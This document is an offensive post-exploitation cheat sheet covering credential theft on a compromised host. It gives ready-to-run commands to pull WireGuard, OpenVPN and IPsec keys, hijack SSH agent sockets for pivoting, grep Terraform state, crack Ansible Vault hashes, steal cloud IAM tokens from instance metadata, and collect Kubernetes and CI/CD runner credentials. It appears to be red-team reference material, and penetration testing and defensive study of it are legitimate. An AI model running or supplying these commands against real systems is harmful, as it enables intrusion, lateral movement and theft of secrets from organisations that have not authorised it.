# VPN Credential Extraction & IaC Secrets Exposure

Techniques for extracting VPN credentials, IaC secrets, and cloud metadata for lateral movement
and privilege escalation.

---

## VPN Credentials

### WireGuard

**Config locations:**
```bash
ls -la /etc/wireguard/ 2>/dev/null
find / -name '*.conf' -path '*/wireguard/*' 2>/dev/null
find / -name 'wg*.conf' 2>/dev/null
```

**What to extract:**
```bash
# Private key (the crown jewel -- full VPN impersonation)
grep PrivateKey /etc/wireguard/*.conf 2>/dev/null

# Pre-shared keys (additional layer)
grep PresharedKey /etc/wireguard/*.conf 2>/dev/null

# Peer endpoints (network topology map)
grep -E 'Endpoint|AllowedIPs' /etc/wireguard/*.conf 2>/dev/null

# Active interfaces and peers
wg show 2>/dev/null
ip link show type wireguard 2>/dev/null
```

**What you get:**
- `PrivateKey` = full impersonation of this host on the VPN
- `AllowedIPs` = network map of what each peer can reach
- `Endpoint` = public IP:port of other VPN peers
- `PreUp`/`PostUp` scripts = potential code execution vectors

**Attack paths:**
- Clone the WireGuard config to your machine, connect to the VPN as the compromised host
- Use `AllowedIPs` to map internal network segments reachable via VPN
- Check `PreUp`/`PostUp`/`PreDown`/`PostDown` scripts for writable paths (code injection)

**Recent CVEs:**
- CVE-2026-27899: WireGuard Portal privilege escalation -- any authenticated user can become admin via `PUT /api/v1/users/me` with `"IsAdmin": true` (fixed in v2.1.3)
- CVE-2026-29196: Netmaker API exposes WireGuard private keys to low-privileged users (fixed in v1.5.0)

---

### OpenVPN

**Config locations:**
```bash
find / -name '*.ovpn' -o -name '*.conf' -path '*/openvpn/*' 2>/dev/null
ls -la /etc/openvpn/ /etc/openvpn/client/ /etc/openvpn/server/ 2>/dev/null
```

**What to extract:**
```bash
# Embedded certificates and keys (inline in .ovpn)
grep -A 100 '<ca>' /etc/openvpn/*.ovpn 2>/dev/null
grep -A 100 '<cert>' /etc/openvpn/*.ovpn 2>/dev/null
grep -A 100 '<key>' /etc/openvpn/*.ovpn 2>/dev/null
grep -A 10 '<tls-auth>' /etc/openvpn/*.ovpn 2>/dev/null

# External key/cert file paths
grep -E 'ca |cert |key |tls-auth|tls-crypt' /etc/openvpn/*.conf 2>/dev/null

# Credential files (auth-user-pass <file>)
grep 'auth-user-pass' /etc/openvpn/*.conf 2>/dev/null
# Then read the referenced file -- contains username on line 1, password on line 2

# Management interface (often localhost:7505, no auth by default)
grep 'management' /etc/openvpn/*.conf 2>/dev/null
```

**Management interface abuse:**
```bash
# If management interface is enabled (default port 7505)
echo "status" | nc localhost 7505
echo "log 100" | nc localhost 7505
# Can reveal connected clients, traffic stats, and auth info
```

**Attack paths:**
- Extract `.ovpn` file with embedded certs -> connect from attacker machine
- Read `auth-user-pass` credential file -> reuse credentials elsewhere
- Abuse management interface for client info and session control

**Recent CVEs (Windows-focused but awareness-worthy):**
- CVE-2024-27903: Plugin loading from arbitrary directory (Windows, < 2.6.10)
- CVE-2024-27459: Stack overflow in interactive service -> LPE (Windows, < 2.6.10)
- CVE-2024-24974: Remote access to service pipe (Windows, < 2.6.10)
- On Linux: OpenVPN running as root + compromised config = direct root shell via `--up` scripts

---

### IPsec (strongSwan / Libreswan)

**Config locations:**
```bash
cat /etc/ipsec.secrets 2>/dev/null     # PSKs and private key paths
cat /etc/ipsec.conf 2>/dev/null        # Tunnel definitions
ls -la /etc/swanctl/ 2>/dev/null       # Modern strongSwan config
cat /etc/swanctl/swanctl.conf 2>/dev/null
```

**What to extract:**
```bash
# Pre-shared keys (PSK)
# Format: <left> <right> : PSK "the-secret-key"
cat /etc/ipsec.secrets 2>/dev/null

# RSA private keys
grep -E 'RSA|ECDSA' /etc/ipsec.secrets 2>/dev/null

# XAUTH credentials
grep XAUTH /etc/ipsec.secrets 2>/dev/null

# Tunnel topology (left/right addresses, subnets)
grep -E 'left=|right=|leftsubnet|rightsubnet' /etc/ipsec.conf 2>/dev/null
```

**Active IKE enumeration (from attacker machine):**
```bash
# Discover IKE service and supported transforms
ike-scan TARGET_IP

# Aggressive mode -- captures PSK hash for offline cracking
ike-scan -A -n GROUP_NAME TARGET_IP
# The response contains a hash that can be cracked with:

# psk-crack (part of ike-scan)
psk-crack -d wordlist.txt captured_hash

# Or John the Ripper
ikescan2john.py captured_response > hash.txt
john --wordlist=rockyou.txt hash.txt

# Or hashcat (mode 5300 for IKEv1, 5400 for IKEv2)
hashcat -m 5300 hash.txt wordlist.txt
```

**Security note:** IKEv1 Aggressive Mode with PSK transmits the hash in the clear. IKEv2 and
IKEv1 Main Mode do not have this weakness. If you see aggressive mode in the config, the PSK
is crackable.

---

## SSH Agent Hijacking

Not technically VPN, but the most common tunnel pivot in post-exploitation.

### From Root on a Multi-User System

```bash
# Find active SSH agent sockets
find /tmp -name 'agent.*' -user '*' 2>/dev/null
ls -la /tmp/ssh-*/agent.* 2>/dev/null

# For each logged-in user with agent forwarding
for pid in $(pgrep -u targetuser sshd); do
  sock=$(grep -z SSH_AUTH_SOCK /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | cut -d= -f2)
  if [ -n "$sock" ] && [ -S "$sock" ]; then
    echo "Found: $sock (PID $pid)"
    SSH_AUTH_SOCK="$sock" ssh-add -l  # List available keys
    SSH_AUTH_SOCK="$sock" ssh user@next-target  # Pivot
  fi
done
```

### SSH Tunneling (Post-Compromise Pivoting)

```bash
# Local port forward: access remote_host:8080 via localhost:8080
ssh -L 8080:remote_host:8080 user@pivot

# Remote port forward: expose local port on the pivot
ssh -R 9090:localhost:9090 user@pivot

# Dynamic SOCKS proxy: route all traffic through pivot
ssh -D 1080 user@pivot
# Then use: proxychains nmap -sT internal_network

# ProxyJump chain (multi-hop)
ssh -J user@pivot1,user@pivot2 user@final_target
```

---

## IaC Secrets Exposure

### Terraform State Files

Terraform state contains every secret in plaintext -- database passwords, API keys, TLS certs,
cloud credentials. This is a known limitation with no first-class fix (open issue for 6+ years).

```bash
# Find state files
find / -name 'terraform.tfstate' -o -name 'terraform.tfstate.backup' 2>/dev/null
find / -name '.terraform' -type d 2>/dev/null

# Extract secrets
grep -E 'password|secret|token|key|credential' terraform.tfstate 2>/dev/null

# Remote state backend credentials
cat .terraform/terraform.tfstate   # local cache of remote state
grep -r 'backend' *.tf 2>/dev/null  # find backend config

# Environment variables
env | grep -i TF_VAR_
```

**What you get:** database passwords, cloud API keys, TLS private keys, any `sensitive = true`
variable (still stored in state -- the flag only hides it from plan output).

### Ansible Vault Cracking

```bash
# Find vault-encrypted files
grep -rl '$ANSIBLE_VAULT' / 2>/dev/null
find / -name 'vault.yaml' -o -name 'vault.yml' 2>/dev/null

# Find vault password files
find / -name '.vault_pass*' -o -name 'vault_password*' 2>/dev/null
cat ~/.ansible/vault_password_file 2>/dev/null

# If you find the vault password file, decrypt directly
ansible-vault decrypt vault.yaml --vault-password-file=/path/to/vault_pass

# If no password file, crack it
# Step 1: Extract hash
ansible2john vault.yaml > vault_hash.txt

# Step 2: Crack with hashcat (mode 16900)
hashcat -m 16900 -O -a 0 -w 4 vault_hash.txt /usr/share/wordlists/rockyou.txt

# Step 3: Decrypt with recovered password
ansible-vault view vault.yaml --ask-vault-pass
```

**Also check:**
```bash
# Plaintext secrets in group_vars/host_vars (not vaulted)
find / -path '*/group_vars/*' -o -path '*/host_vars/*' 2>/dev/null | \
  xargs grep -l 'password\|secret\|token' 2>/dev/null

# SSH keys referenced in inventory
grep 'ansible_ssh_private_key_file' /path/to/inventory* 2>/dev/null

# ansible.cfg with vault password path
grep 'vault_password_file' /path/to/ansible.cfg 2>/dev/null
```

### Cloud Metadata / IMDS

Accessible from any process on a cloud VM or k8s pod (unless explicitly blocked).

```bash
# AWS (IMDSv1 -- no auth needed)
curl -s http://169.254.169.254/latest/meta-data/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns temporary AWS credentials (AccessKeyId, SecretAccessKey, Token)

# AWS (IMDSv2 -- needs token header)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Azure (requires Metadata header)
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# DigitalOcean
curl -s http://169.254.169.254/metadata/v1/
```

**From k8s pods:** IMDS is accessible unless blocked by NetworkPolicy or node iptables.
In EKS, pods can steal the node's IAM role credentials unless IRSA (IAM Roles for Service
Accounts) is configured.

### Kubernetes Secrets on Disk

```bash
# kubeconfig files (cluster admin access)
cat ~/.kube/config 2>/dev/null
cat /etc/kubernetes/admin.conf 2>/dev/null
find / -name 'kubeconfig' -o -name '.kubeconfig' 2>/dev/null

# Static pod manifests (may contain secrets)
ls /etc/kubernetes/manifests/ 2>/dev/null

# etcd data directory (contains all cluster secrets)
ls /var/lib/etcd/ 2>/dev/null

# Sealed Secrets controller private key (decrypt everything)
# On a node with etcd access:
# etcdctl get /registry/secrets/kube-system/sealed-secrets-key*

# Service account tokens
find / -path '*/serviceaccount/token' 2>/dev/null

# CNI config (may have cloud provider creds)
cat /etc/cni/net.d/*.conf 2>/dev/null
```

### CI/CD Credential Files

```bash
# .env files (the classic)
find / -name '.env' -not -path '*/node_modules/*' 2>/dev/null

# Forgejo/Gitea runner tokens
cat /home/*/.config/forgejo-runner/*.yaml 2>/dev/null

# GitHub Actions runner credentials
find / -path '*actions-runner/.credentials' 2>/dev/null

# GitLab Runner config (registration tokens)
cat /etc/gitlab-runner/config.toml 2>/dev/null

# Docker registry credentials
cat ~/.docker/config.json 2>/dev/null
```
